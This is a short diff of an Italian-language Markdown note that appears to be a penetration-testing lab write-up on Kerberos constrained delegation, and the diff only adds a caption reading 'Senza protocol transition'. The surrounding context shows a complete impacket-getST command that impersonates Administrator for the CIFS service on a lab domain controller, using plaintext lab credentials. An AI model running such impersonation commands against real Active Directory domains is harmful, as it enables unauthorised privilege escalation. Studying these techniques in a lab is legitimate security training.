@@ -32,3 +32,4 @@ Per exploitarlo isogna prima chiedere un TGT per l'utente e poi esguire S4U2Self
 impacket-getST -spn 'CIFS/winterfell' -impersonate Administrator -dc-ip '192.168.56.11' 'north.sevenkingdoms.local/jon.snow:iknownothing'
 ```
 ![[Pasted image 20230911111655.png]]
+*Senza protocol transition*
